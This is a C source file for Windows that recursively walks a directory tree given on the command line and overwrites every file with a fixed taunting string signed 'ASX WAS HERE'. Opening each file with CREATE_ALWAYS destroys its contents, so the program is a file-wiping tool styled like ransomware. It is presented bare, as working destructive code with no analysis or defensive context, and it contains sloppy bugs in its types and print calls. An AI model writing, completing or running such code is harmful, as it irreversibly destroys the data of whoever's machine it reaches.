#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <tchar.h>
#pragma comment(lib, "User32.lib")

#define ERROR "[-]"
#define SUCCESS "[+]"
#define INFO "[>]"

BOOL SpiderDirectory(char *DirectoryName, unsigned char *encrypted_code) {
    WIN32_FIND_DATA ffd;
    LPCSTR szDir[MAX_PATH];
    LPCSTR finalDir[MAX_PATH];
    HANDLE hFind = INVALID_HANDLE_VALUE;
    LARGE_INTEGER filesize;
    long file_size;
    file_size = strlen(encrypted_code);
    LPCSTR lpFileName = NULL;
    char fullPath[MAX_PATH];
    LPCSTR ultraDir[MAX_PATH];
    LPCSTR subDir[MAX_PATH];

    StringCchCopy(szDir, MAX_PATH, DirectoryName);
    sprintf(finalDir, "%s\\\\*", szDir);

    printf("===========%s\n", finalDir);

    printf("\nTarget directory is %s\n\n", DirectoryName);

    hFind = FindFirstFileA(finalDir, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
    }
    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(".", ffd.cFileName) == 0 || strcmp("..", ffd.cFileName) == 0) {
                continue;
            }
            sprintf(subDir, "%s\\%s", szDir, ffd.cFileName);
            printf("%s   <DIR>\n", subDir);
            SpiderDirectory(subDir, encrypted_code);
        }
        else {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
            lpFileName = ffd.cFileName;
            sprintf(ultraDir, "%s\\%s", szDir, lpFileName);
            WriteToFile(ultraDir, encrypted_code, file_size);
        }
    } while (FindNextFileA(hFind, &ffd) != 0);
}

BOOL WriteToFile(LPCSTR lFileName, unsigned char* encrypted_code, long file_size) {
    HANDLE hEncryptedFile = NULL;

    printf("%s filename: '%s'\n", INFO, lFileName);
    hEncryptedFile = CreateFileA(lFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hEncryptedFile == INVALID_HANDLE_VALUE) {
        printf("%s CreateFile failed with error: 0x%x\n", ERROR);
    }

    DWORD bytesWritten;
    printf("%s filesize: %d\n", INFO, file_size);
    if (!WriteFile(hEncryptedFile, encrypted_code, file_size, &bytesWritten, NULL)) {
        printf("WriteFile failed with error: 0x%x\n");
        return 1;
    }
}

int main(int argc, char* argv[]) {
    //Must be in format C:\\Users
    char* DirectoryName = argv[1];
    unsigned char* encrypted_code = "Yaaaaaa lets pwn the world cray motherfucker!!!!!!!! FTW FTW FTW ASX WAS HERE FTW FTW FTW==============";
    SpiderDirectory(DirectoryName, encrypted_code);
}
